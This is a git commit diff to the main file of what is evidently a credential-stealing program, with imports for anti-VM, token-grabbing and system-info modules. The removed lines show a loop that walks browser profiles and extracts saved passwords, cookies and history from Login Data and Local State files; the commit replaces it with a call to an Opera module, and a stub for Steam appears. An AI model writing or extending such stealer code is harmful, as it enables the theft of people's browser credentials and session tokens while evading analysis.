19b9417d111bf73b3b983fc876699402bfc7165b
Aniko <gtabro666@gmail.com>
2023-03-12 19:03:19 +0100

    Opera lib

--- main.py
+++ main.py
@@ -2,6 +2,8 @@ from core import extractor
 from core import antivm
 from core import sysinfo
 from core import tokengrabber
+from core import opera
+
 
 from threading import Thread
 
@@ -20,35 +22,7 @@ class Main:
         
 
     def browser(self):
-        for browserKey in extractor.browsers_profile:
-            browserValue = extractor.browsers_profile[browserKey]
-
-            if os.path.exists(browserValue):
-                profiles = ["Default"]
-
-                for folder in os.listdir(browserValue):
-                    if folder.startswith("profile".lower()):
-                        profiles.append(folder)
-
-                for profile in profiles:
-                    browserExtractor = extractor.Extract(browserValue+"\\Local State")
-                    history = browserExtractor.extractHistory(browserValue+f"\\{profile}\\History")
-                    passwd = browserExtractor.extractPasswd(browserValue+f"\\{profile}\\Login Data")
-                    cookies = browserExtractor.extractCookies(browserValue+f"\\{profile}")
-                
-
-        for browserKey in extractor.browsers:
-            browserValue = extractor.browsers[browserKey]
-
-            if os.path.exists(browserValue):
-                browserExtractor = extractor.Extract(browserValue+"\\Local State")
-                history = browserExtractor.extractHistory(browserValue+"\\History")
-                passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
-                cookies = browserExtractor.extractCookies(browserValue)
-
-                print(history)
-                print(passwd)
-                print(cookies)
+        opera.main()
 
     def steam(self):
         pass
